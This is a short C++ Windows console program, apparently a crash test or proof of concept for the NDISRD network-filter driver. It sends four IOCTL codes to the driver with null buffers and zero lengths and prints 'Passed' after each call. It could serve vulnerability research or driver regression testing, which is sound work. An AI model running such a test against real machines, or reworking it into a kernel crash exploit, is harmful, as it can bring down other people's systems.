// crashtest.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

int Test0x830020E0()
{
	HANDLE m_handle = 0;
	DWORD nbBytes = 0;
	m_handle = CreateFile(_T("\\\\.\\NDISRD"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);

	if (m_handle != INVALID_HANDLE_VALUE)
	{
		printf("Succesfully opened NDISRD: Testing 0x830020E0 \n");
		DeviceIoControl(m_handle, 0x830020E0, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
		CloseHandle(m_handle);
	}

	printf("Test0x830020E0 Passed \n");

	return 0;
}

int Test0x830020E4()
{
	HANDLE m_handle = 0;
	DWORD nbBytes = 0;
	m_handle = CreateFile(_T("\\\\.\\NDISRD"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);

	if (m_handle != INVALID_HANDLE_VALUE)
	{
		printf("Succesfully opened NDISRD: Testing 0x830020E4 \n");
		DeviceIoControl(m_handle, 0x830020E4, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
		CloseHandle(m_handle);
	}

	printf("Test0x830020E4 Passed \n");

	return 0;
}

int Test0x830020F8()
{
	HANDLE m_handle = 0;
	DWORD nbBytes = 0;
	m_handle = CreateFile(_T("\\\\.\\NDISRD"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);

	if (m_handle != INVALID_HANDLE_VALUE)
	{
		printf("Succesfully opened NDISRD: Testing 0x830020F8 \n");
		DeviceIoControl(m_handle, 0x830020F8, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
		CloseHandle(m_handle);
	}

	printf("Test0x830020F8 Passed \n");

	return 0;
}

int Test0x8300210C()
{
	HANDLE m_handle = 0;
	DWORD nbBytes = 0;
	m_handle = CreateFile(_T("\\\\.\\NDISRD"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);

	if (m_handle != INVALID_HANDLE_VALUE)
	{
		printf("Succesfully opened NDISRD: Testing 0x8300210C \n");
		DeviceIoControl(m_handle, 0x8300210C, (LPVOID)0, 0x0, (LPVOID)0, 0x0, &nbBytes, NULL);
		CloseHandle(m_handle);
	}

	printf("Test0x8300210C Passed \n");

	return 0;
}

int main()
{
	Test0x830020E0();
	Test0x830020E4();
	Test0x830020F8();
	Test0x8300210C();

    return 0;
}

